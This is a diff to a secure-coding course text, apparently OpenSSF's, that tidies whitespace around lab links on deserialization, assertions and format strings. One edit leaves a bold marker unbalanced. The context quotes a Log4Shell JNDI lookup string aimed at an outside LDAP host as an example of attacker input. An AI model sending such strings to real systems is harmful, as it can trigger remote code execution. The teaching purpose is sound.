@@ -1938,8 +1938,8 @@ Some people recommend enforcing string type constraints (e.g., only allowing spe
 🔔 Insecure deserialization is such a common mistake in web applications that it is 2017 OWASP Top 10 #8, 2021 CWE Top 25 #13, and 2019 CWE Top 25 #23. It is [CWE-502](https://cwe.mitre.org/data/definitions/502.html), *Deserialization of Untrusted Data*. It is also considered part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*. Attackers may find such vulnerabilities harder to exploit, but once the vulnerability is found it can result in immediate compromise of an entire system, because it may provide complete control of the system to the attacker.
 
 #### Lab: Insecure Deserialization
- 
-🧪 **Lab: Please try lab [deserialization](https://best.openssf.org/labs/deserialization.html), which lets you experiment with how to counter insecure deserialization vulnerabilities.**
+
+🧪 **Lab: Please try lab [deserialization](https://best.openssf.org/labs/deserialization.html), which lets you experiment with how to counter insecure deserialization vulnerabilities.*
 
 *Labs are optional, but you're strongly encouraged to try them!*
 
@@ -3351,7 +3351,7 @@ Assertions are often great, because they can stop problems before they get more 
 Inserting assertions can make a verification technique called “fuzzing” more effective. So, it is often a good idea to have many assertions, as long as they are expressions that absolutely *should* always be true. We will discuss fuzzing in more detail later.
 
 #### Lab: Debug and Assertion Code
- 
+
 🧪 **Lab: Please try lab [assert](https://best.openssf.org/labs/assert.html), which lets you experiment with how to counter reachable assertion vulnerabilities.**
 
 *Labs are optional, but you're strongly encouraged to try them!*
@@ -3956,8 +3956,8 @@ Many output formatting systems have a way to support internationalization (**i18
 > log4j is a software component written in Java that implements logging (recording events for later auditing and debugging). It is widely used for logging, including by Apple iPhones, Teslas, and Minecraft chat. Log4Shell (formally CVE-2021-44228) is an extremely serious vulnerability in the log4j 2.X series. In vulnerable versions of log4j, "an attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.” (NVD, [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) It's easy to trigger; an attacker can include logged text with forms like `${jndi:ldap://45.83.193.150:1389/Exploit}`. There were almost 8,000 tests in the log4j project, but none found this; the tests showed that expected functions worked, but didn't ensure that this undesired functionality would not work. This is an example of allowing untrusted users to control the output format, in this case enabling the execution of arbitrary code. Be wary of giving untrusted users this dangerous level of control!
 
 #### Lab: Format Strings and Templates
- 
-+🧪 **Lab: Please try lab [format-strings](https://best.openssf.org/labs/format-strings.html), which lets you experiment with how to counter format string vulnerabilities.**
+
+🧪 **Lab: Please try lab [format-strings](https://best.openssf.org/labs/format-strings.html), which lets you experiment with how to counter format string vulnerabilities.**
 
 *Labs are optional, but you're strongly encouraged to try them!*
 
